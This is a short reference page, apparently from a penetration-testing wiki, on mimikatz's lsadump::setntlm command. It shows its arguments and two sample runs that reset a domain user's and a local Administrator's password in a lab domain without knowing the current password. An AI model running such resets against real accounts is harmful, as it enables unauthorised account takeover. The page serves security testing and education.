# setntlm

`lsadump::setntlm` can be used to perform a password reset without knowing the user's current password. It can be useful during an active directory [Access Control (ACL) abuse](https://www.thehacker.recipes/ad/movement/access-controls) scenario. It has the following command line arguments:

* `/ntlm`: The new NT hash for the target user
* `/user`: The username of the account to target
* `/password`: The new password for the target user
* `/server`: hostname of the target server

{% hint style="info" %}
LM and NT hashes are used to authenticate accounts using the NTLM protocol. These hashes are often called NTLM hash and many documentations, resources, blogpost and tools mix terms. In this case, "ntlm" refers to the NT hash.

([more information](https://www.thehacker.recipes/ad/movement/ntlm))
{% endhint %}

### Reset for a Domain User

```
mimikatz # lsadump::setntlm /user:optimus /password:VeryStrongPass1! /server:dc.hacklab.local
NTLM         : 7cb0b13a4661116dd2c306fb2f4536b2

Target server: dc.hacklab.local
Target user  : optimus
Domain name  : hacklab
Domain SID   : S-1-5-21-2725560159-1428537199-2260736313
User RID     : 1732

>> Informations are in the target SAM!
```

### Reset for a Local User

```
mimikatz # lsadump::setntlm /user:Administrator /password:Super_SecretPass1! /server:Win10.hacklab.local
NTLM         : b09a14d2d325026f8986d4a874fbcbc7

Target server: Win10.hacklab.local
Target user  : Administrator
Domain name  : WIN10
Domain SID   : S-1-5-21-1604892360-3618202543-1602915806
User RID     : 500

>> Informations are in the target SAM!
```
